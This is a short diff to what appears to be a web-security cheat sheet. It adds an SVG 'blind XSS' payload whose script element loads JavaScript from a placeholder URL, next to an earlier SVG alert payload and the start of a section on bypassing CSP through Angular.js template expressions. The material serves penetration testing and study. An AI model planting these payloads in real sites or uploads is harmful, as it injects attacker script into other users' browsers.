@@ -22,6 +22,12 @@ alert("SVG XSS");
 </svg>
 
 ```
+SVG based blind XSS:   
+```
+<svg version="1.1" baseProfile="full" xmlns="http://w3.org/2000/svg" xmlns:xlink="http://w3.org/1999/xlink" >
+  <script type="text/javascript"  xlink:href="URL"></script>
+</svg>
+```
 
 ## Using Angular.js to bypass CSP
 If you can find a place in a web page where e.g.  `{{7*7}}` gets displayed on client-side as '49' (if its returned as 49, then its server-side template injection!), you can try to bypass CSP with:   
